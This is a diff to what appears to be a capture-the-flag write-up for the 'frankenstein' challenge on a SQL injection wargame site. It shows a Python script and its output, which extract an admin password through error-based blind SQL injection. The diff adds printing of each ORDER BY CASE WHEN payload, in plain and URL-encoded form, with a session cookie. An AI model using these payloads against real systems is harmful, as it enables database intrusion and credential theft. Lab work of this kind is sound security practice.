@@ -56,13 +56,12 @@ import requests
 import urllib.parse
 import string
 
-cookies = {'PHPSESSID': '4qt1p0e0vguiq8oousdc88vhv9'}
+cookies = {'PHPSESSID': 'fpl88d0ujgtatq5qt4a6o5n4om'}
 url = 'https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php'
 
 password = ''
 end = False
 searchspace = string.digits + string.ascii_letters
-print()
 
 for index in range(1, 100):
   if (end == True):
@@ -79,6 +78,9 @@ for index in range(1, 100):
     if ("login_chk" in response.text):
       continue
     elif ("error" in response.text):
+      print()
+      print(f"[+] Payload: ?order={payload}")
+      print(f"[+] Payload (URL encoded): ?order={encoded_payload}")
       print(f'[+] Character at index {index}: {char}')
       password = password + char
       end = False
@@ -92,13 +94,36 @@ print(f'[!] Final payload: ?pw={password}')
 ```
 $ python .\frankenstein_script.py
 
+[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
+[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-
 [+] Character at index 1: 0
+
+[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0d%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
+[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270d%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-
 [+] Character at index 2: d
+
+[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
+[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-
 [+] Character at index 3: c
+
+[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc4%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
+[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc4%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-
 [+] Character at index 4: 4
+
+[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc4e%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
+[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc4e%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-     
 [+] Character at index 5: e
+
+[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc4ef%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
+[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc4ef%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-    
 [+] Character at index 6: f
+
+[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc4efb%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
+[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc4efb%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-   
 [+] Character at index 7: b
+
+[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc4efbb%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
+[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc4efbb%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-  
 [+] Character at index 8: b
 
 [!] Extracted password: 0dc4efbb
